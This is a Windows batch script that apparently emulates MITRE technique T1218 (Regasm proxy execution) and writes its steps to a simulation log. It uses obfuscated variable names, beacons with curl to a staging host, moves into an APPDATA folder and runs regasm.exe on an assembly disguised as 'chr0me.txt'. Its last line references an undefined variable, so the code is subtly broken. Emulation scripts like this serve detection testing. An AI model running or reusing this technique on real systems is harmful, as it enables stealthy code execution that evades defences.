@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8622\1ad5c64b
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8622-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=chr0me.txt
SET ewjmdkff=8622
SET cdopk=!APPDATA!\!pudaazx!
SET uusjznf=!cdopk!\macula-simulations.log
SET nbvvc=!syjfr!
SET dlwz=T1218
SET elbb=Signed Binary Proxy Execution: Regasm

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_start>> "!uusjznf!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: heartbeat_complete>> "!uusjznf!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_start=!pjkcpgw!>> "!uusjznf!" 2>nul
cd /d "!pjkcpgw!" 2>nul
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: chdir_complete=!CD!>> "!uusjznf!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_start=regasm.exe>> "!uusjznf!" 2>nul
SET rbsj=0
SET zvtrv=
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U "!nbvvc!" 2>nul
IF NOT !ERRORLEVEL! EQU 0 (
    SET rbsj=0
    SET zvtrv=assembly_load_failed
) ELSE (
    SET rbsj=1
)
echo [!DATE! !TIME!][DEBUG][!hlbnp!]: process_complete=!ERRORLEVEL!>> "!uusjznf!" 2>nul
echo [!DATE! !TIME!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!dlbb!|!elbb!=!rbsj!:!zvtrv!>> "!uusjznf!" 2>nul